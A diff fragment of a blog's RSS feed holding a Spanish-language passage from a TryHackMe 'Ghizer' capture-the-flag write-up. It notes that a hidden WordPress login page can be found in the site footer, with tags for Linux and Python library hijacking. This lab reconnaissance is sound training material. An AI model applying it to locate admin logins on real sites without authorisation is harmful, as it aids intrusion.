+&lt;p&gt;En el puerto 443 o https encontramos un mensaje en el index, donde indica que la pagina del login de wordpress ha sido escondida con el plugin &lt;code&gt;WPS Hide Login&lt;/code&gt; &amp;hellip;&lt;br /&gt;
+&lt;div class=&#34;alert alert-danger&#34; role=&#34;alert&#34; data-dir=&#34;ltr&#34;&gt;&lt;strong&gt;SPOILER&lt;/strong&gt;&lt;/div&gt;
+&lt;/p&gt;
+&lt;div class=&#34;expand&#34;&gt;
+  &lt;button type=&#34;button&#34; class=&#34;expand__button&#34; aria-label=&#34;Expand Button&#34;&gt;
+    &lt;span class=&#34;expand-icon expand-icon__right&#34;&gt;
+        &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;24&#34; height=&#34;24&#34; viewBox=&#34;0 0 24 24&#34;&gt;&lt;path fill=&#34;currentColor&#34; d=&#34;M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z&#34;/&gt;&lt;/svg&gt;
+    &lt;/span&gt;
+    SOPOILER
+  &lt;/button&gt;
+  &lt;div class=&#34;expand__content&#34;&gt;
+    &amp;hellip; es posible encontrar la pagina de login en el footer.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/Screenshot_20200904_163719.png&#34; alt=&#34;image&#34; /&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/thm/ghizer/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/thm/ghizer/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>linux</category>
+            
+          
+            
+              <category>python library hijacking</category>
+            
+          
+        
+        
+          
+            
+              <category>tryhackme</category>
+            
+          
+        
+        
+      </item>
       
       <item>
         <title>TryHackMe - Wonderland</title>
